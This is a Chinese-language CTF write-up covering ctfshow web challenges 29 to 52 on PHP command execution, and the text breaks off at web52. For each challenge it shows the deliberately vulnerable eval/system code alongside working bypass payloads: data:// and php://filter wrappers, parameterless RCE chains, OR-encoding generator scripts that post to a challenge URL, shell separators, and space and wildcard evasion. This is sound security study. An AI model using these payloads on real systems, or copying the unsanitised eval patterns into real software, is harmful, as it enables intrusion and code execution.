---
title: ctfshow命令执行
date: 2025-09-05 16:10:52
tags:
- CTF
- Web
- 命令执行RCE
- 无参RCE
- php伪协议
- Linux系统命令
- 过滤绕过
- POC
categories:
- ctfshow-web入门wp
description: " "
---



# web29

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**过滤了 `flag`**

**payload**

```bash
?c=system(“tac%20fla*”);
```

<img src="\images\article_images\image-20250426112927919.png" alt="image-20250426112927919" style="zoom:33%;" />

&nbsp;



---

# web30

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**过滤了 `flag`、`system`、`php`**

**payload**

```bash
?c=passthru("tac%20fla*");
```

<img src="\images\article_images\image-20250426114032665.png" alt="image-20250426114032665" style="zoom:33%;" />

&nbsp;



---

# web31

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

&nbsp;



**==题解一==**

**`system` 被过滤可以用 `passthru` 函数绕过， `cat` 被过滤可以用 `more、less、nl` 绕过(但我试过 `more` 不行？？)，空格被过滤可以用 `${IFS}`、`%09` 绕过。**

> **空格绕过**
>
> **`${IFS}` 但不能写作 `$IFS`**
>
> **`$IFS$`**
>
> **`%09`**
>
> **`<>`**
>
> **`<`**
>
> **$IFS%09**

```php
?c=passthru("tac%09fla*");
```

<img src="\images\article_images\image-20250426120052078.png" alt="image-20250426120052078" style="zoom:33%;" />

&nbsp;

&nbsp;



**==题解二==**

**以 `c` 作为跳板执行另一个参数 `a` 的命令，`a` 的命令不受限制**

```php
?c=eval($_GET[a]);&a=system("cat flag.php");#之后F12查看源代码

?c=eval($_GET[a]);&a=system("tac flag.php");
```

<img src="\images\article_images\image-20250426143314154.png" alt="image-20250426143314154" style="zoom: 25%;" />

&nbsp;



---

# web32

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**过滤了  单引号、反引号、分号 等符号**

**文件包含漏洞**

```php
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="\images\article_images\image-20250426134002689.png" alt="image-20250426134002689" style="zoom:33%;" />

&nbsp;



<img src="\images\article_images\image-20250426133944069.png" alt="image-20250426133944069" style="zoom:33%;" />

&nbsp;



---

# web33

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 02:22:27
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
//
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

&nbsp;



> **多过滤了双引号，用数组作为参数即可绕过**

**==题解一==**

**同上**

```php
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="\images\article_images\image-20250426143608404.png" alt="image-20250426143608404" style="zoom: 25%;" />

&nbsp;



**==题解二==**

```php
?c=require$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="\images\article_images\image-20250426144027048.png" alt="image-20250426144027048" style="zoom:80%;" />

&nbsp;



---

# web34

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**多过滤了冒号、括号**

**不能使用 `echo`**

**不能使用 `eval`  因为需要括号**

**同上**

**payload**

```php
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="\images\article_images\image-20250426135503562.png" alt="image-20250426135503562" style="zoom:33%;" />

&nbsp;

---

# web35

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**过滤了 尖括号、等于号**

**同上**

**payload**

```php
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="\images\article_images\image-20250426135943905.png" alt="image-20250426135943905" style="zoom:33%;" />

&nbsp;



---

# web36

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

**过滤了 数字**

**同上**

**payload**

```php
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="\images\article_images\image-20250426140956823.png" alt="image-20250426140956823" style="zoom: 33%;" />

&nbsp;

---

# web37

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

**payload**

```php
?c=data://text/plain,<?php system("tac fla*");?>
```

<img src="\images\article_images\image-20250426185406502.png" alt="image-20250426185406502" style="zoom:33%;" />

&nbsp;



> - 当你使用 **`?c=data://text/plain,<?php system("tac fla*");?>`** 时，PHP 会通过 `data://` 伪协议动态生成一个 PHP 文件，并将其内容当作 PHP 代码来执行。
> - **`include()`** 的作用是加载这个动态生成的文件内容并执行它。
> - 在这个过程中，**`system("tac fla*")`** 被执行，其输出直接写入到 **HTTP 响应流中（stdout）**，因此你可以看到 **`flag.php`** 的内容。
>
> 换句话说，**`system()` 的输出并不是被 `include()` 捕获，而是直接写入到 HTTP 响应中** 。这就是为什么你能看到 `flag.php` 的内容。

&nbsp;

---

# web38

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

**题目过滤 “php” “flag”**

> 将 **`<?php system(“tac fla*”);?>`**进行**base64**编码得到 **`PD9waHAgc3lzdGVtKCJ0YWMgZmxhKiIpOz8+`**
>
> 但是URl会将 `+` 解析成空格，所以这个不行

**构造payload**

```php
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==     

#由<?php system("tac flag.php");?> 进行base64编码而来
```

**或者利用短标签，将 `php` 换成 `=`**

```php
?c=data://text/plain,<?=%20system("cat%20fla*");?>
```

```php
?c=data://text/plain,<?=%20system("tac%20fla*");?>
```

<img src="\images\article_images\image-20250426190031953.png" alt="image-20250426190031953" style="zoom: 50%;" />

&nbsp;



---

# web39

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

&nbsp;



**payload**

```php
?c=data://text/plain,<?= system("tac fla*");?>

?c=data://text/plain,<?php system("tac fla*");?>
```

<img src="\images\article_images\image-20250427123513944.png" alt="image-20250427123513944" style="zoom:33%;" />

&nbsp;



---

# web40

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

&nbsp;



**无参文件读取**

**==题解一==**

**通过构造payload输出当前文件下的文件名**

```php
print_r(scandir(‘.’));
```

**但是由于过滤了相关符号，所以不能使用这个payload，要想办法去掉 `.` 小数点**

```php
getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串

get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是二维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));

session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie
中的phpsessionid，并且这个值我们是可控的。
如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHP
SESSID=706870696e666f28293b
session_start 函数是为了开启session
 
配合使⽤的函数：
print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名    print_r输出数组   print输出字符串
var_dump()
localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。localeconv() 返回数组的第一个元素通常是："."
current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名
each() 返回数组中当前的键/值对并将数组指针向前移动⼀步
end() 将数组的内部指针指向最后⼀个单元
next() 将数组中的内部指针向前移动⼀位
prev() 将数组中的内部指针倒回⼀位
array_reverse() 以相反的元素顺序返回数组
```

**构造payload等价于 `print_r(scandir(‘.’));`**

```php
?c=print_r(scandir(current(localeconv())));
?c=print_r(scandir(pos(localeconv())));
?c=print_r(scandir(reset(localeconv())));
```

&nbsp;

<img src="\images\article_images\image-20250503112614366.png" alt="image-20250503112614366" style="zoom:80%;" />

```php
Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )
```

&nbsp;

**可以发现 `flag.php` 在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取。以下payload达到的效果是：输出 `flag.php` 源码，安全绕过字符过滤器**

```php
?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));

?c=show_source(next(array_reverse(scandir(current(localeconv())))));
```

**$flag="ctfshow{d960f2a2-e9a5-4b80-a806-5e6a0e6b85c6}";**

<img src="\images\article_images\image-20250503113247089.png" alt="image-20250503113247089" style="zoom:33%;" />

&nbsp;



**==题解二==**

✅ **Step 1:** **`get_defined_vars()` 是 PHP 的内置函数，返回当前作用域里定义的所有变量**

```php
?c=print_r(get_defined_vars());
```

<img src="\images\article_images\image-20250503115725841.png" alt="image-20250503115725841" style="zoom:33%;" />

&nbsp;



**返回结果**

```php
Array (
    [_GET] => Array ( [c] => print_r(get_defined_vars()); )
    [_POST] => Array ( )
    [_COOKIE] => Array ( )
    [_FILES] => Array ( )
    [c] => print_r(get_defined_vars());
)
```

**说明现在已经有变量 `$_GET`、`$_POST`、还有 `c` 等都在作用域内。**

&nbsp;



**✅ Step 2: post传参**

```bash
1=phpinfo();
```

**确认通过 POST 成功地注入了一段代码字符串**

<img src="\images\article_images\image-20250503120006048.png" alt="image-20250503120006048" style="zoom: 33%;" />

&nbsp;



```php
Array (
	[_GET] => Array ( [c] => print_r(get_defined_vars()); ) 
	[_POST] => Array ( [1] => phpinfo(); ) 
	[_COOKIE] => Array ( ) 
	[_FILES] => Array ( ) 
	[c] => print_r(get_defined_vars()); 
)
```

&nbsp;



**✅ Step 3：返回数组**

```php
?c=print_r(next(get_defined_vars()));
```

**可以成功拿到phpinfo()数组**

<img src="\images\article_images\image-20250503120059077.png" alt="image-20250503120059077" style="zoom:80%;" />

&nbsp;



**然后我们想让 `eval()` 执行这个 `phpinfo();`，但我们不能直接写 `eval($_POST['1'])`，因为 `[` 和 `]` 被正则拦截了。**

&nbsp;



**✅ Step 4:**

**弹出数组**

```php
array_pop(...)           // 从这个数组中“弹出”最后一个值
```

**从 `$_POST` 数组中“取出”我们传的值：`phpinfo();`**

```php
?c=print_r(array_pop(next(get_defined_vars())));
```

<img src="\images\article_images\image-20250503124459045.png" alt="image-20250503124459045" style="zoom:80%;" />

&nbsp;



**页面返回 phpinfo()     这意味着我们已经成功拿到了想要执行的恶意代码字符串**

&nbsp;



**✅ Step 5: 执行代码 得到php配置页面**

```php
?c=eval(array_pop(next(get_defined_vars())));
```

<img src="\images\article_images\image-20250503124621948.png" alt="image-20250503124621948" style="zoom:80%;" />

&nbsp;



**✅ Step 6：post传参**

```bash
1=system("tac fla*");
```

<img src="\images\article_images\image-20250503124758256.png" alt="image-20250503124758256" style="zoom: 25%;" />

&nbsp;



```php
用户传入：
?c=eval(array_pop(next(get_defined_vars())))

程序执行：
eval("eval(array_pop(next(get_defined_vars())))")

第一个 eval 执行：
eval(array_pop(next(get_defined_vars())))

第二个 eval 执行：
system("tac fla*");
```

&nbsp;



---

# web41

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

**这道题过滤了 数字 和 字母 (因为后面 `/i` 对大小写不敏感)，并且不能用 `异或`、`取反`、`自增` 等操作（过**

**滤 `$`、`+`、`-`、`^`、`~` ），但是可以用 `|` (或)**

&nbsp;

**==题解一==**

**先通过以下 `1.php` 脚本生成一个 `rce_or.txt`，内容是上述可用字符及编码。**

```php
#1.php

<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

<img src="\images\article_images\image-20250503153743360.png" alt="image-20250503153743360" style="zoom:33%;" />

&nbsp;

**运行python脚本 `rec_or.py`** 

<img src="\images\article_images\image-20250503154445517.png" alt="image-20250503154445517" style="zoom:25%;" />

&nbsp;

**cmd命令**

```powershell
...>python rce_or.py http://8f42bff8-638e-4021-b42a-8e4fbb5a0e50.challenge.ctf.show/
```

<img src="\images\article_images\image-20250503154203547.png" alt="image-20250503154203547" style="zoom:80%;" />



```python
#rce_or.py
# -*- coding: utf-8 -*-

import requests
import urllib
from sys import *
import os


os.system("php rce_or.php")  #没有将php写入环境变量需手动运行

if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
   
url=argv[1]


def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")//rce_or.txt
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
   data={
       'c':urllib.parse.unquote(param)
       }
   r=requests.post(url,data=data)
   print("\n[*] result:\n"+r.text)
```



&nbsp;

**==题解二==**

**ctfshow_web41.py**

```python
#ctfshow_web41.py
import re
import requests

available = []
url = "http://8f42bff8-638e-4021-b42a-8e4fbb5a0e50.challenge.ctf.show/" #  修改URL

for i in range(0,256):
    result = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',chr(i),re.I)
    if result is None:
        available.append(chr(i))

key1 = "system"         #修改命令
key2 = "cat flag.php"   #修改命令
gkey1 = ""
gkey2 = ""
data1 = ""
data2 = ""

def orkey(pos,keys):
    global gkey1
    global gkey2
    for i in range(0,len(available)):
        for j in range(i,len(available)):
            if ord(available[i])|ord(available[j]) == ord(keys[pos]):
                gkey1 += available[i]
                gkey2 += available[j]
                return

for i in range(len(key1)):
    orkey(i,key1)
data1 = "(\""+gkey1+"\"|"+"\""+gkey2+"\")"

gkey1 = ""
gkey2 = ""

for i in range(len(key2)):
    orkey(i,key2)
data2 = "(\""+gkey1+"\"|"+"\""+gkey2+"\")"

data ={
    "c":data1 + data2
}
res = requests.post(url,data)
print(res.text)
```

<img src="\images\article_images\image-20250503161318154.png" alt="image-20250503161318154" style="zoom:33%;" />

&nbsp;

---

# web42

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 20:51:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

&nbsp;

> **`/dev/null` —— “黑洞”设备文件**
>
> `/dev/null` 是 Linux 系统中一个特殊的设备文件，可以看作一个“数据黑洞”：
>
> - **写入**它的所有内容都会被**丢弃**；
> - **读取**它则永远什么也得不到（立即返回 EOF）。
>
> 📌 常见用途：
>
> | 操作                       | 意义                                             |
> | -------------------------- | ------------------------------------------------ |
> | `command > /dev/null`      | 把标准输出丢弃，禁止输出任何正常信息             |
> | `command 2> /dev/null`     | 把标准错误丢弃，屏蔽错误信息                     |
> | `command > /dev/null 2>&1` | 同时屏蔽标准输出和标准错误，终端不会显示任何信息 |
>
> &nbsp;
>
> **`1>/dev/null 2>&1` 的含义和解析**
>
> 分解成五步解释：
>
> ✅ 表达形式：
>
> ```bash
> command 1>/dev/null 2>&1
> ```
>
> ✅ 关键点详解：
>
> | 表达部分    | 含义                                                      |
> | ----------- | --------------------------------------------------------- |
> | `1>`        | 标准输出（stdout，文件描述符1）的重定向                   |
> | `/dev/null` | 重定向的目标是黑洞设备文件，等价于"扔掉"                  |
> | `2>`        | 标准错误（stderr，文件描述符2）的重定向                   |
> | `&1`        | 代表“重定向到与文件描述符1相同的地方”，即stdout当前的去向 |
>
> &nbsp;
>
> 🎯 整体理解：
>
> - `1>/dev/null`：标准输出被重定向到 /dev/null，不显示任何正常信息；
> - `2>&1`：标准错误也被重定向到标准输出的目标（此时标准输出已经是 /dev/null），所以**错误信息也不显示**。
>
> ✅ 所以最终效果是：**所有输出（正常 + 错误）全部被丢弃，终端不会显示任何信息。**

&nbsp;

**题目这里是 `$c` 参数后面接了个 `>/dev/null 2>&1` ，使用`> /dev/null 2>&1`将命令结果全部丢弃（不进行回显的意思）**

```bash
;	//分号
|	//只执行后面那条命令(把前一个命令的输出作为后一个命令的输入)
||	//只执行前面那条命令(只有前一个命令执行失败（退出码非 0），才执行后一个命令)
&	//两条命令都会执行(让前面的命令在后台运行，立即返回执行下一条命令)
&&	//两条命令都会执行(只有前一个命令执行成功（退出码是 0），才执行后一个命令)
```

**构造payload**

```bash
?c=tac fla*;
?c=tac fla*||
?c=tac fla*%0a             #利用换行分隔
?c=cat flag.php||          #之后查看源代码
?c=tac%20fla*%26%26        #即为?c=tac%20fla*&&，将前面的命令保留，后面的命令丢弃，&需要URL编码
```

<img src="\images\article_images\image-20250503170615023.png" alt="image-20250503170615023" style="zoom:33%;" />

&nbsp;

---

# web43

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**正则过滤  `;` `cat`**

**payload参考web42**

```php
?c=tac fla*||
?c=tac fla*%0a             #利用换行分隔
?c=tac%20fla*%26%26        #即为?c=tac%20fla*&&，将前面的命令保留，后面的命令丢弃，&需要URL编码
```

<img src="\images\article_images\image-20250503171813642.png" alt="image-20250503171813642" style="zoom:33%;" />

&nbsp;

---

# web44

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**正则过滤  `;` `cat` `flag`**

**payload参考web42**

```php
?c=tac fla*||
?c=tac fla*%0a             #利用换行分隔
?c=tac%20fla*%26%26        #即为?c=tac%20fla*&&，将前面的命令保留，后面的命令丢弃，&需要URL编码
```

<img src="\images\article_images\image-20250503172131947.png" alt="image-20250503172131947" style="zoom:33%;" />

&nbsp;

---

# web45

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**正则过滤  `;` `cat` `flag` `空格`**

**payload参考web42**

> `%09` 代替空格

```php
?c=tac%09fla*||
?c=tac%0afla*%0a             #利用换行分隔
?c=tac%0afla*%26%26        #即为?c=tac%20fla*&&，将前面的命令保留，后面的命令丢弃，&需要URL编码
```

<img src="\images\article_images\image-20250503172518578.png" alt="image-20250503172518578" style="zoom:33%;" />

&nbsp;

---

# web46

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**正则过滤  `;` `cat` `flag` `空格` `数字` `$` `*`**

**用 `?` 代替 `*` 即可**

> `%09` 不是数字

**payload参考web42**

```php
?c=tac%09fl?g.php||
?c=tac%09fla?.???||
```

&nbsp;

---

# web47

```Php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**在前几题基础上过滤了 `more` `less` `head` `sort` `tail`**

**payload不变**

```php
?c=tac%09fl?g.php||
?c=tac%09fla?.???||
```

<img src="\images\article_images\image-20250503190038198.png" alt="image-20250503190038198" style="zoom:33%;" />

&nbsp;

---

# web48

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**payload：**

```php
?c=tac%09fla?.php||
```

&nbsp;

---

# web49

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**payload：**

```php
?c=tac%09fla?.php||
```

<img src="\images\article_images\image-20250503190526773.png" alt="image-20250503190526773" style="zoom: 50%;" />

&nbsp;



---

# web50

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
    
}
```

**想到用 `<>` 代替 `%09`**

> **但是发现 `<>` 和 `?` 组合的时候是没有回显输出的**

**所以使用 `\` 或 ` ''` 代替 `?`**

```php
?c=tac<>fla\g.php||
?c=tac<>fla\g.php%0a    
?c=tac<>fla''g.php||
```

<img src="\images\article_images\image-20250503191717813.png" alt="image-20250503191717813" style="zoom:33%;" />

&nbsp;

---

# web51

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

**过滤了 `tac`**

> **另外同cat功能的函数还有：**
>
> **cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev**

```php
?c=nl<>fl\ag.php||
```

<img src="\images\article_images\image-20250503192158790.png" alt="image-20250503192158790" style="zoom:33%;" />

&nbsp;

----

# web52

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:50:30
# @email: h1xa@ctfer.com
